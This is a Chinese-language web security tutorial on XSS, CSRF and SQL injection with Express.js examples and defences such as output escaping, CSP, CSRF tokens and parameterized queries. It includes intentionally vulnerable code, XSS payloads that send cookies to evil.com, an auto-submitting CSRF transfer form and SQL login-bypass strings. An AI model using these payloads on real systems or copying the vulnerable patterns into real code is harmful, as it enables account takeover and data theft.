# Web 安全基础：XSS、CSRF、SQL注入与防护完全指南

Web 安全是每个开发者必须掌握的知识。本文将深入讲解常见的 Web 安全漏洞及其防护措施。

## 一、XSS（跨站脚本攻击）

### 1. 什么是 XSS

XSS（Cross-Site Scripting，跨站脚本攻击）是一种代码注入攻击，攻击者通过在网页中注入恶意脚本，在用户浏览器中执行。

### 2. XSS 的类型

#### 2.1 存储型 XSS（Stored XSS）

恶意脚本存储在服务器端（如数据库），用户访问时执行。

**示例：**

```javascript
// 评论功能 - 存在漏洞的代码
app.post('/comment', (req, res) => {
  const { content } = req.body;
  // 直接存储用户输入，未过滤
  db.saveComment(content);
  res.redirect('/');
});

// 显示评论 - 直接输出
app.get('/', (req, res) => {
  const comments = db.getComments();
  res.send(`
    <html>
      ${comments.map(c => `<div>${c.content}</div>`).join('')}
    </html>
  `);
});
```

**攻击：**

用户输入恶意评论：
```html
<script>
  // 窃取 Cookie
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

#### 2.2 反射型 XSS（Reflected XSS）

恶意脚本在 URL 中，服务器反射回页面。

**示例：**

```javascript
// 搜索功能 - 存在漏洞
app.get('/search', (req, res) => {
  const { q } = req.query;
  // 直接输出搜索词
  res.send(`
    <html>
      <h1>搜索结果: ${q}</h1>
    </html>
  `);
});
```

**攻击 URL：**

```
https://example.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

#### 2.3 DOM 型 XSS（DOM-based XSS）

恶意脚本在客户端 DOM 中执行，不经过服务器。

**示例：**

```html
<!DOCTYPE html>
<html>
<body>
  <div id="output"></div>
  
  <script>
    // 从 URL 获取参数
    const urlParams = new URLSearchParams(window.location.search);
    const name = urlParams.get('name');
    
    // 直接插入 DOM
    document.getElementById('output').innerHTML = `
      <h1>Hello, ${name}!</h1>
    `;
  </script>
</body>
</html>
```

**攻击 URL：**

```
https://example.com/?name=<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

### 3. XSS 防护措施

#### 3.1 输出编码

对输出到 HTML 的内容进行转义。

```javascript
// HTML 转义函数
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// 使用
app.get('/', (req, res) => {
  const comments = db.getComments();
  res.send(`
    <html>
      ${comments.map(c => `<div>${escapeHtml(c.content)}</div>`).join('')}
    </html>
  `);
});
```

#### 3.2 使用安全的模板引擎

```javascript
// EJS - 自动转义
// <%= %> 会自动转义
<div><%= comment.content %></div>

// React - JSX 自动转义
function Comment({ content }) {
  return <div>{content}</div>;
}

// Vue - {{ }} 自动转义
<div>{{ comment.content }}</div>
```

#### 3.3 设置 Content Security Policy (CSP)

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; img-src 'self' data:; style-src 'self' 'unsafe-inline';
```

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  img-src 'self' data:;
  style-src 'self' 'unsafe-inline';
">
```

#### 3.4 使用 HttpOnly Cookie

```javascript
// Express.js
res.cookie('session', 'xxx', {
  httpOnly: true,  // JavaScript 无法访问
  secure: true,     // 仅 HTTPS
  sameSite: 'Strict' // 防止 CSRF
});
```

#### 3.5 输入验证

```javascript
// 验证输入
const Joi = require('joi');

const commentSchema = Joi.object({
  content: Joi.string()
    .max(500)
    .pattern(/^[a-zA-Z0-9\u4e00-\u9fa5\s.,!?]*$/)
    .required()
});

app.post('/comment', (req, res) => {
  const { error, value } = commentSchema.validate(req.body);
  if (error) {
    return res.status(400).send('输入无效');
  }
  db.saveComment(value.content);
  res.redirect('/');
});
```

## 二、CSRF（跨站请求伪造）

### 1. 什么是 CSRF

CSRF（Cross-Site Request Forgery，跨站请求伪造）是攻击者诱导用户在已登录的网站上执行非本意的操作。

### 2. CSRF 攻击示例

#### 受害者已登录银行网站：

```javascript
// 银行网站 - 存在漏洞的转账接口
app.post('/transfer', (req, res) => {
  const { to, amount } = req.body;
  // 只检查 session，没有 CSRF token
  if (req.session.user) {
    bank.transfer(req.session.user.id, to, amount);
    res.send('转账成功');
  }
});
```

#### 攻击者构造恶意页面：

```html
<!DOCTYPE html>
<html>
<body>
  <h1>免费抽奖！</h1>
  
  <!-- 隐藏的表单 -->
  <form id="evil-form" action="https://bank.example.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker-account">
    <input type="hidden" name="amount" value="10000">
  </form>
  
  <script>
    // 自动提交表单
    document.getElementById('evil-form').submit();
  </script>
</body>
</html>
```

### 3. CSRF 防护措施

#### 3.1 使用 CSRF Token

```javascript
// Express.js + csurf
const csurf = require('csurf');
const csrfProtection = csurf({ cookie: true });

// 设置 CSRF token
app.get('/transfer', csrfProtection, (req, res) => {
  res.send(`
    <form action="/transfer" method="POST">
      <input type="hidden" name="_csrf" value="${req.csrfToken()}">
      <input type="text" name="to">
      <input type="number" name="amount">
      <button type="submit">转账</button>
    </form>
  `);
});

// 验证 CSRF token
app.post('/transfer', csrfProtection, (req, res) => {
  const { to, amount } = req.body;
  if (req.session.user) {
    bank.transfer(req.session.user.id, to, amount);
    res.send('转账成功');
  }
});
```

#### 3.2 使用 SameSite Cookie

```javascript
res.cookie('session', 'xxx', {
  httpOnly: true,
  secure: true,
  sameSite: 'Strict'  // 或者 'Lax'
});
```

| SameSite 值 | 说明 |
|------------|------|
| Strict | 完全禁止第三方 Cookie |
| Lax | 允许部分第三方请求（推荐） |
| None | 允许所有（需配合 Secure） |

#### 3.3 验证 Referer/Origin Header

```javascript
app.post('/transfer', (req, res) => {
  const referer = req.get('Referer');
  const origin = req.get('Origin');
  
  const isValid = referer?.startsWith('https://bank.example.com') ||
                  origin === 'https://bank.example.com';
  
  if (!isValid) {
    return res.status(403).send('CSRF 攻击检测');
  }
  
  // 继续处理
});
```

#### 3.4 使用自定义 Header

```javascript
// 前端
fetch('/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ to, amount })
});

// 后端验证
app.post('/transfer', (req, res) => {
  if (req.get('X-Requested-With') !== 'XMLHttpRequest') {
    return res.status(403).send('无效请求');
  }
  // 继续处理
});
```

## 三、SQL 注入

### 1. 什么是 SQL 注入

SQL 注入（SQL Injection）是攻击者通过在输入中插入 SQL 代码，操纵数据库查询。

### 2. SQL 注入示例

#### 存在漏洞的登录代码：

```javascript
// ❌ 危险！直接拼接 SQL
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // 直接拼接 SQL - 存在注入风险
  const sql = `
    SELECT * FROM users 
    WHERE username = '${username}' AND password = '${password}'
  `;
  
  db.query(sql, (err, results) => {
    if (results.length > 0) {
      req.session.user = results[0];
      res.send('登录成功');
    } else {
      res.send('用户名或密码错误');
    }
  });
});
```

#### 攻击输入：

```
用户名: admin' --
密码: 任意
```

#### 生成的 SQL：

```sql
SELECT * FROM users 
WHERE username = 'admin' -- ' AND password = '任意'
```

`--` 是 SQL 注释，后面的条件被忽略了！

#### 另一个攻击：

```
用户名: ' OR '1'='1
密码: 任意
```

#### 生成的 SQL：

```sql
SELECT * FROM users 
WHERE username = '' OR '1'='1' AND password = '任意'
```

`'1'='1'` 永远为真，可以登录任意账户！

### 3. SQL 注入防护措施

#### 3.1 使用参数化查询（Prepared Statements）

```javascript
// ✅ 安全！使用参数化查询
const mysql = require('mysql2/promise');

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const connection = await mysql.createConnection({
    host: 'localhost',
    user: 'root',
    database: 'mydb'
  });
  
  // 使用 ? 占位符
  const [rows] = await connection.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password]
  );
  
  if (rows.length > 0) {
    req.session.user = rows[0];
    res.send('登录成功');
  } else {
    res.send('用户名或密码错误');
  }
});
```

#### 3.2 使用 ORM

```javascript
// Sequelize ORM
const { Sequelize, Model, DataTypes } = require('sequelize');

const sequelize = new Sequelize('mydb', 'root', 'password', {
  dialect: 'mysql'
});

class User extends Model {}
User.init({
  username: DataTypes.STRING,
  password: DataTypes.STRING
}, { sequelize });

// 查询 - 自动防止注入
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await User.findOne({
    where: {
      username: username,
      password: password
    }
  });
  
  if (user) {
    req.session.user = user;
    res.send('登录成功');
  } else {
    res.send('用户名或密码错误');
  }
});
```

#### 3.3 输入验证和过滤

```javascript
const Joi = require('joi');

const loginSchema = Joi.object({
  username: Joi.string()
    .alphanum()
    .min(3)
    .max(30)
    .required(),
  password: Joi.string()
    .min(6)
    .required()
});

app.post('/login', (req, res) => {
  const { error, value } = loginSchema.validate(req.body);
  if (error) {
    return res.status(400).send('输入无效');
  }
  // 继续处理
});
```

#### 3.4 最小权限原则

```sql
-- 不要使用 root 用户
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';

-- 只授予必要的权限
GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'app_user'@'localhost';

-- 不要授予 DROP、ALTER 等危险权限
```

## 四、其他安全威胁

### 1. 点击劫持（Clickjacking）

```http
X-Frame-Options: DENY
# 或者
X-Frame-Options: SAMEORIGIN
```

```html
<meta http-equiv="X-Frame-Options" content="DENY">
```

### 2. 敏感数据泄露

```javascript
// ❌ 错误：直接返回密码
res.send({
  id: user.id,
  name: user.name,
  password: user.password  // 不要返回密码！
});

// ✅ 正确：只返回必要字段
res.send({
  id: user.id,
  name: user.name,
  email: user.email
});
```

```javascript
// 密码哈希存储
const bcrypt = require('bcrypt');

// 注册时哈希
const saltRounds = 10;
const hashedPassword = await bcrypt.hash(password, saltRounds);

// 登录时验证
const match = await bcrypt.compare(password, hashedPassword);
```

### 3. 速率限制（防止暴力破解）

```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 分钟
  max: 5, // 最多 5 次
  message: '登录尝试次数过多，请稍后再试'
});

app.post('/login', loginLimiter, (req, res) => {
  // 登录逻辑
});
```

## 五、安全最佳实践检查清单

- [ ] 对所有用户输入进行验证和编码
- [ ] 使用参数化查询防止 SQL 注入
- [ ] 使用 CSRF Token 防护 CSRF 攻击
- [ ] 设置 CSP 防止 XSS
- [ ] 使用 HttpOnly 和 SameSite Cookie
- [ ] 密码使用 bcrypt/argon2 哈希存储
- [ ] 实施 HTTPS（HSTS）
- [ ] 设置安全的 HTTP 头
- [ ] 实施速率限制
- [ ] 定期更新依赖包
- [ ] 使用安全的 session 管理
- [ ] 日志和监控
- [ ] 安全测试和代码审查

## 六、总结

Web 安全是一个持续的过程，没有绝对的安全。但通过实施本文介绍的措施，可以大大降低安全风险：

1. **XSS**：输出编码、CSP、HttpOnly Cookie
2. **CSRF**：CSRF Token、SameSite Cookie
3. **SQL 注入**：参数化查询、ORM
4. **其他**：HTTPS、安全头、速率限制

安全无小事，时刻保持警惕！

## 参考资料

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [MDN Web Security](https://developer.mozilla.org/zh-CN/docs/Web/Security)
- [Content Security Policy](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
